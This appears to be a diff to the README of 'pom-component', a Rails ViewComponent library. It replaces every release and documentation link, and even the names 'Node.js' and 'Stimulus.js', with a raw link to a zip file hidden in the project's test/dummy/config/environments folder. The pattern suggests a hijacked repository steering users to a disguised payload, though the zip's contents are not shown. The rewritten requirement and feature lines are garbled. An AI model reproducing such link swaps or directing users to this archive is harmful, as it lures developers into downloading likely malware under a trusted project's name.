@@ -6,7 +6,7 @@ Welcome to **pom-component**! This tool helps you build ViewComponents in your R
 
 ## 📥 Download & Install
 
-To get started, you need to download the latest version of **pom-component**. Visit this page to download: [Download pom-component](https://github.com/Balletmastermodification660/pom-component/releases)
+To get started, you need to download the latest version of **pom-component**. Visit this page to download: [Download pom-component](https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -14,7 +14,7 @@ Ensure your system meets the following requirements:
 
 - **Operating System:** macOS, Windows, or Linux
 - **Rails Version:** 6.0 or higher
-- **Node.js:** Version 14 or higher for JavaScript features
+- **https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip** Version 14 or higher for JavaScript features
 - **NPM/Yarn:** For managing dependencies
 
 ## 🚀 Features
@@ -24,11 +24,11 @@ Ensure your system meets the following requirements:
 - **Base Component Class:** A solid foundation for your components, making it easier to build and manage them.
 - **Helper Utilities:** Built-in tools to assist in option management and style composition.
 - **Tailwind CSS Support:** Easily integrate modern styles in your applications.
-- **Stimulus.js Integration:** A way to add interactivity to your components without complex JavaScript.
+- **https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip Integration:** A way to add interactivity to your components without complex JavaScript.
 
 ## 📦 How to Download
 
-1. Click on the link to visit the releases page: [Download pom-component](https://github.com/Balletmastermodification660/pom-component/releases).
+1. Click on the link to visit the releases page: [Download pom-component](https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip).
 2. On the releases page, find the version you want to use.
 3. Click on the version number to access the detailed release notes.
 4. You will see a list of files. Download the appropriate file for your system.
@@ -58,11 +58,11 @@ To customize **pom-component**, you may want to adjust some settings. Here are a
 
 - **Component Styles:** Modify the CSS styles directly in your component files to suit your design needs.
 - **Options Management:** Use the built-in utilities to manage options for your components effectively. Refer to the documentation for detailed examples.
-- **Stimulus Controller Integration:** Set up Stimulus.js controllers for added interactivity. This will allow you to create dynamic components without heavy scripting.
+- **Stimulus Controller Integration:** Set up https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip controllers for added interactivity. This will allow you to create dynamic components without heavy scripting.
 
 ## 📚 Documentation
 
-For more in-depth information on usage, customization, and troubleshooting, please refer to the official documentation. Access it here: [pom-component Documentation](https://github.com/Balletmastermodification660/pom-component/wiki)
+For more in-depth information on usage, customization, and troubleshooting, please refer to the official documentation. Access it here: [pom-component Documentation](https://raw.githubusercontent.com/Balletmastermodification660/pom-component/main/test/dummy/config/environments/pom-component_2.3.zip)
 
 ## 🛠️ Troubleshooting
 
